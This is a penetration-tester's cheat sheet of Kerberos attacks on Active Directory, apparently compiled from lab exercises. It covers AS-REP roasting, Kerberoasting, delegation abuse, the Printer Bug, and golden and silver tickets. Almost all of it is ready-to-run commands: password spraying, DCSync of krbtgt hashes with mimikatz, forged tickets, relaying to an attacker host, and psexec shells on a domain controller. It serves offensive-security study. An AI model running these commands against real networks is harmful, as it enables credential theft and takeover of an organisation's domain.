---
description: Kerberoasting | ASPRoasting | Delegation | Printer Bug
---

# Kerberos

| Service Type                               | Service Silver Tickets | Attack                                                                                                           |
| ------------------------------------------ | ---------------------- | ---------------------------------------------------------------------------------------------------------------- |
| WMI                                        | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`                  |
| PowerShell Remoting                        | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC`                                          |
| WinRM                                      | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC`                                          |
| Scheduled Tasks                            | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
| Windows File Share (CIFS)                  | CIFS                   | `dir \\dc01\c$`                                                                                                  |
| LDAP operations including Mimikatz DCSync  | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt`                                                     |
| Windows Remote Server Administration Tools | RPCSS + LDAP + CIFS    | /                                                                                                                |

### <mark style="color:yellow;">ASREP Roasting</mark>

If an account has Kerberos pre-authentication disabled i can request a TGT. Send a special AS\_REQ (Authentication Service Request) packet to the KDC, pretending to be the user. An AS\_REP is sent back with a key derived from password. With `GenericAll` its also possible to enable `DONT_REQ_PREAUTH`.

From Windows

```powershell
# Powerview
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Enable DONT_REQ_PREAUTH with powerview
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
# Rubeus
.\Rubeus.exe asreproast /user:john.doe /domain:zencorp.local /dc:dc01.zencorp.local /nowrap /outfile:hashes.txt
```

From Linux

```bash
# Bash with GetNPUsers.py
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

# Get Users
GetNPUsers.py zencorp.local/joe
kerbrute userenum usernamelist.txt --dc dc01.zencorp.local -d zencorp.local 

# With users list
GetNPUsers.py -usersfile users -format hashcat -dc-ip 172.16.8.3 'ZENCORP.LOCAL/'

# Password spray
kerbrute passwordspray usernamelist.txt pass@!23 --dc dc01.zencorp.local -d zencorp.local

# Get User hashes
GetNPUsers.py zencorp.local/joe -request

# GetNPUsers.py
python3 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.129.254.42 'ZENCORP.LOCAL/j.doe'

# Find accounts without authentication
GetNPUsers.py ZENCORP/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

### <mark style="color:yellow;">Kerberoasting from Windows</mark>

```powershell
# Using powerview find users with SPN set
Get-DomainUser -SPN

# Kerberoast
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation

# Read hashes
cat .\tgs.csv

# Automatic method
Invoke-Kerberoast

# Using Rubeus
Rubeus.exe kerberoast /nowrap
```

#### Kerberoast without account password

If we know of an account without Kerberost pre-auth enabled we can use an AS-REQ (used for TGT request) to request a TGS ticket for a kerberoastable user. Its done by modifying the req-body of the request. You need a username with DONT\_REQ\_PREAUTH and SPNs list.&#x20;

```powershell
# Rubeus attack with /nopreauth
Rubeus.exe kerberoast /nopreauth:john.doe /domain:zencorp.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```

### <mark style="color:yellow;">Kerberoasting from Linux</mark>

```bash
# Get accounts with spn set
GetUserSPNs.py inlanefreight.local/john

# Request STs and hashes
GetUserSPNs.py inlanefreight.local/john -request
GetUserSPNs.py -dc-ip 172.16.51.5 ZENCORP.LOCAL/user -request 
```

### <mark style="color:yellow;">Check ASREP and Kerberoastble accounts</mark>

```powershell
# Check for ASREP
Get-ADUser -Filter {DoesNotRequirePreAuth -eq 'True'}

# Check SPN
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | Select-Object Name, SamAccountName, ServicePrincipalName
```

### <mark style="color:yellow;">Unconstrained Delegation - Computers</mark>

If compromised a server and Domain admin logs in we can extract their TGT.

```powershell
# Monitoring for logins
.\Rubeus.exe monitor /interval:5 /nowrap

# Use ticket to request another ticket
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.ZENCORP.local /ptt

# Get new TGT 
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```

### <mark style="color:yellow;">Printer Bug</mark>

Printer Bug is a vulnerability in the MS-RPRN protocol which is used for managing print jobs and printers. This bug can trick a server into authenticating to another machine over SMB.

```powershell
# Rubeus in monitor mode
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger Printer Bug
.\SpoolSample.exe dc01.zencorp.local sql01.zencorp.local

# Use retrieved ticket to get a new TGT
.\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIB9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt

# With TGT in memory perform DCSync
.\mimikatz.exe privilege::debug "lsadump::dcsync /domain:zencorp.local /user:administrator" exit
```

Using a hash and impersonate John Doe

```powershell
# Pass the ticket
.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:john.doe /ptt

# Acces DC as john.doe
dir \\dc01.inlanefreight.local\c$
more \\DC01\Shares\Marketing\flag.txt
```

Using S4U2self for non-DC's

If target is a non-DC we can use S4U2self to obtain service ticket on behalf of any user. CIFS will enable SMB connections.

```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.zencorp.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>

# Dir or read file
ls \\dc01.zencorp.local\c$
more \\DC01\Shares\Marketing\flag.txt
```

### <mark style="color:yellow;">Unconstrained Delegation - Users</mark>

Needs account with TRUSTED\_FOR\_DELEGATION and GenericWrite to update SPN list.

```powershell
# Look for users with TRUSTED_FOR_DELEGATION
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

1. Create a Fake DNS Record

```bash
# krbrelayx
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx

# Create fake record
python dnstool.py -u ZENCORP.LOCAL\\john -p p4ssw0rd -r fakepc.ZENCORP.LOCAL -d attackerIP --action add targetIP

# Verify record
nslookup fakepc.zencorp.local dc01.zencorp.local
```

2. Add SPN

```bash
# Add SPN
python addspn.py -u ZENCORP.local\\john -p p4ssw0rd --target-type samname -t sqldev -s CIFS/fakepc.ZENCORP.local dc01.ZENCORP.local
```

3. Listen with krbrelay and let printerbug let DC01 authenticate to our machine.

```bash
# Decrypt ticket
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58 -t dc01.inlanefreight.local

# Printerbug
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@attackerIP roguecomputer.inlanefreight.local
```

4. Use TGT to DCSync

```bash
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
secretsdump.py -k -no-pass dc01.zencorp.local
```

### <mark style="color:yellow;">Constrained Delegation</mark>

From windows

```powershell
# Constrained delegation with Rubeus
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.zencorp.local /altservice:HTTP /user:DMZ01$ /rc4:c48771baa19sfsa0e8045fbafd0b52d0 /ptt

# Get remote shell
Enter-PSSession ws01.inlanefreight.local
```

From Linux

```bash
# Find accounts with delegation privs
findDelegation.py INLANEFREIGHT.LOCAL/john.doe:pass123

# Get a valid TGS
getST.py -spn TERMSRV/DC01 'ZENCORP.LOCAL/roger.jones:p@ss123$' -impersonate Administrator

# Using the ticket
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass ZENCORP.LOCAL/administrator@DC01 
```

### <mark style="color:yellow;">Resource-based constrained delegation (RBCD) from Windows</mark>

<details>

<summary>Search for users</summary>

```powershell
# import the PowerView module
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```

</details>

{% hint style="info" %}
The easiest way to obtain an object with SPN is to use a computer, even by making a fake computer.&#x20;
{% endhint %}

#### Create a computer account

```powershell
# Import PowerMad
Import-Module .\Powermad.ps1

# Create computer account
New-MachineAccount -MachineAccount ZENPC -Password $(ConvertTo-SecureString "pass132" -AsPlainText -Force)
$ComputerSid = Get-DomainComputer ZENPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "ZENCORP\john.doe", (ConvertTo-SecureString "pass123" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

#### Get hash of our account, then get ticket.&#x20;

```powershell
# Get hash of computer account
.\Rubeus.exe hash /password:pass123 /user:ZEN$ /domain:ZENCORP.local

# Get TGS 
.\Rubeus.exe s4u /user:ZENPC$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.zencorp.local /ptt

# Get access
ls \\dc01.inlanefreight.local\c$
```

### <mark style="color:yellow;">RBCD From Linux</mark>

Create computer account

```bash
addcomputer.py -computer-name 'ZENPC$' -computer-pass pass@123 -dc-ip 10.129.205.35 zencorp.local/john.doe
```

Add account to targeted computer's trust list

```bash
rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX zencorp\\john.doe:passwd@123
```

Request TGT, then S4U2Self to get TGS, adn then S42UProxy for valid TGS for specific SPN

```bash
getST.py -spn cifs/DC01.zencorp.local -impersonate Administrator -dc-ip 10.129.205.35 zencorp.local/ZENPC:pass@123
```

Use ticket to pwn

```bash
KRB5CCNAME=Administrator@cifs_DC01.inlanefreight.local@ZENCORP.LOCAL.ccache psexec.py -k -no-pass dc01.zencorp.local
```

### <mark style="color:yellow;">RBCD When MachineAccountQuota Is Set to 0</mark>

If unable to create a computer account, or if account has no SPN set we can still perfor the attack [https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).

Get TGT using account NT hash

```bash
# Convert to NT
pypykatz crypto nt 'B3thR!ch@rd$'

# Get TGT
getTGT.py ZENCORP.LOCAL/john.doe -hashes :de3a12633d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
```

Get ticket session key so KDC can decrypt TGT

```bash
describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
```

Change user's password

```bash
changepasswd.py ZENCORP.LOCAL/john.doe@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash :7c3d8b8b135c7d574e423dcd826cab58
```

Request TGS

```bash
KRB5CCNAME=beth.richards.ccache getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass ZENCORP.LOCAL/john.doe -dc-ip 10.129.205.35
```

Acces the DC

```bash
KRB5CCNAME=Administrator@TERMSRV_DC01.ZENCORP.LOCAL@ZENCORP.LOCAL.ccache wmiexec.py DC01.ZENCORP.LOCAL -k -no-pass
```

### <mark style="color:yellow;">Golden ticket from Windows</mark>

To forge a golden ticket you need: Domain name, Domain SID, Username to impersonate, KRBTGT's hash.&#x20;

Get SID and get KRBTGT hash with mimikatz

```powershell
# SID
Get-DomainSID

# Get KRBTGT hash
lsadump::dcsync /user:krbtgt /domain:zencorp.local
```

Then forge a golden ticket

```powershell
kerberos::golden /domain:zencorp.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```

Connect to DC01 using WinRM

```powershell
Enter-PSSession dc01
```

### <mark style="color:yellow;">Golden ticket from Linux</mark>

```bash
# Get SID
lookupsid.py zencorp.local/zen@dc01.zencorp.local -domain-sids

# Craft golden ticket
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain zencorp.local Administrator

# Get access
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.zencorp.local
```

### <mark style="color:yellow;">Silver Ticket from Windows</mark>

```powershell
# Get SID
Import-Module .\PowerView.ps1
Get-DomainSID
```

Create silver ticket. Need hash of Service Account

```powershell
.\mimikatz.exe privilege::debug "kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /user:Administrator /service:CIFS /target:SQL01.zencorp.local /ptt" exit
```

### <mark style="color:yellow;">Sacrificial Processes</mark>

{% hint style="info" %}
A Sacrificial Process creates a new Logon Session, isolating manipulated tickets and preventing impact on critical sessions, so its safer than causing outage. Needs admin rights
{% endhint %}

Check all tickets and extract a krbtgt/ZENCORP.LOCAL service TGT

```powershell
.\Rubeus.exe triage
```

Extract ticket using LUID

```powershell
.\Rubeus.exe dump /luid:0xc2cd0 /service:krbtgt /nowrap
```

Use createnetonly to create sacrificial process.

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Authenticated
.\Rubeus.exe createnetonly /program:powershell.exe /username:holly /password:'Password123!' /domain:zencorp.local /show
```

Within new cmd window

```powershell
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
dir \\dc01\\c$
```









